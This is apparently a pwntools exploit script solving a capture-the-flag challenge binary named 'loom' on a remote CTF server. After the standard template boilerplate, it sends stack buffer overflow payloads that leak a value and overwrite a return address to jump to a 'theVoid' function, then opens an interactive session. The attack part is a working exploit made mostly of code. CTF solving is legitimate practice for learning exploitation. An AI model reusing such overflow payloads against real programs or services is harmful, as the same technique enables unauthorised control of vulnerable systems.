#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 0.cloud.chals.io --port 33616 ./loom
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./loom')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '0.cloud.chals.io'
port = int(args.PORT or 33616)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
# b *0x0000000000401766
# b *0x0000000000401660
continue
b *0x0000000000401494
c
# c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

io.sendline("1")
io.sendline("1")
io.sendline("a"*(280)+p32(0x0000000040232a)+"\x00")
# io.sendline("a"*(280)+p32(exe.sym['aThisisnotthepa'])+"\x00")
io.sendline("2")
io.recvuntil("ancient : \n\n")
leak = str(io.recvline()[:-1])

io.sendline("1")
io.sendline("1")
io.sendline("a"*(160-8)+p64(exe.sym['theVoid']))

io.sendline("3")
io.sendline(leak)
io.sendline("1")

io.interactive()

